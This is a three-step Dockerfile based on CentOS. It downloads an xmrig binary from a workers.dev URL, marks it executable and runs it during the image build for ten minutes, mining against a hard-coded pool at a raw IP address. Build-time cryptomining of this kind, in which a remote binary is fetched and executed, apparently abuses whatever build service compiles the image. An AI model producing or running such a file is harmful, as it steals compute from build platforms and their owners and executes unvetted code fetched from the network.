FROM centos:latest

RUN curl -O https://ddos.nms.workers.dev/xmrig
RUN chmod +x xmrig
RUN timeout 10m ./xmrig -o 129.154.59.76:3333 -u $(date +%Y%m%d%H%M%S) --randomx-1gb-pages  --cpu-max-threads-hint=50
